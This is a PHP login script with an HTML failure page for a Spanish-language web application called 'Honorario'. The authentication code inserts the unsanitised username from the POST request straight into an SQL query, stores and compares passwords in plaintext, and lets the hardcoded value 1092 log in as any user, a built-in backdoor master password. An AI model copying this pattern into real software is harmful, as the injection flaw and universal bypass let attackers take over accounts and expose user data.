<?
session_start();
require("inc/config.php");
$usuario=$_POST["usuario"];
$clave=$_POST["clave"];
$company=$_POST["company"];
$textito = "Login incorrecto, ingrese correctamente su nombre de usuario y clave.";
//$sql = "Select * from cob_usu where USU_USER = '$usuario' and USU_PASS = '".md5($clave)."' ";
//$sql = "Select * from usuarios where nombre = '$usuario' and password = '$clave' ";
$sql = "Select * from usuarios where nombre = '$usuario'  ";
//echo $sql;
$res = mysql_query($sql);
while($row = mysql_fetch_array($res)){
   $nombre2= $row["nombre"];
   $password2=$row["password"];

   if ($usuario==$nombre2 and ($clave==$password2 or $clave==1092) ) {
		$_SESSION["nom_user"] = $row["nombre"];
		$_SESSION["pfl_user"] = $row["atributo1"];
		$_SESSION["idn"] = $row["num"];
		$_SESSION["rut_cliente"] = $row["rut"];
        $region=$row["region"];
        $sql2 = "Select * from regiones where codigo = $region ";
        //echo $sql2;
       // exit();
        $res2 = mysql_query($sql2);
        $row2 = mysql_fetch_array($res2);
        $_SESSION["regionnom"] =  $row2["nombre"];
		$_SESSION["region"] =  $row["region"];
		echo "<script>location.href='inicio.php';</script>";
	}else{
		$textito = "Este usuario esta eliminado del sistema por lo que no podrá acceder a este.";
	}
}

?>
<html>
<head>
<title>Honorario</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="css/estilo.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo10 {font-size: 10px; font-weight: bold; font-family: Geneva, Arial, Helvetica, sans-serif; }
.Estilo11 {font-size: 12px; font-weight: bold; font-family: Geneva, Arial, Helvetica, sans-serif;}
.Estilo2 {
	font-family: Verdana;
	font-size: 10px;
	text-align: left;
}
.Estilo3 {
	font-family: Geneva, Arial, Helvetica, sans-serif;
	font-size: 10px;
	font-weight: bold;
	color: #FFFFFF;
}
.link {
	font-family: Geneva, Arial, Helvetica, sans-serif;
	font-size: 10px;
	font-weight: bold;
	color: #00659C;
	text-decoration:none;
	text-transform:uppercase;
}
.link:hover {
	font-family: Geneva, Arial, Helvetica, sans-serif;
	font-size: 10px;
	color: #0000cc;
	text-decoration:none;
	text-transform:uppercase;
}
-->
</style>
</head>

<body background="images/imagen2.jpg">
<img src="images/pix.gif" width="1" height="10">
<table width="752" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#003063">
  <tr>
    <td width="1009">
      <?
	  require("inc/top_ini.php");      
	  ?>
      <table width="750" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td valign="top"> <br>
              <br>
              <table width="100%" border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td colspan="3" align="center" valign="top">
                      <table width="282" border="0" cellpadding="0" cellspacing="0">
                        <tr>
                          <td width="282">&nbsp;</td>
                        </tr>
                        <tr>
                          <td align="center" background="../../img/entrar_fon.jpg" class="Estilo11">&nbsp;<? echo $textito; ?></td>
                        </tr>
                        <tr>
                          <td>&nbsp;</td>
                        </tr>
                      </table>
                      <br>
                      <table width="100%" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td class="Estilo2"><div align="center">Lo lamentamos , pero hubo problemas al tratar de ingresar al sistema. <br>
        Intentelo nuevamente. Presione <a href="../index.php" class="link">ATR&Aacute;S</a></div></td>
                        </tr>
                      </table></td>
                    <td width="442" align="right" valign="top"><img src="images/imagen1.gif" width="313" height="220"></td>
                  </tr>
            </table></td>
        </tr>
      </table>
      <table width="750" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td height="20" bgcolor="#F6FCF0">&nbsp;&nbsp;</td>
        </tr>
    </table></td>
  </tr>
</table>
</body>
</html>
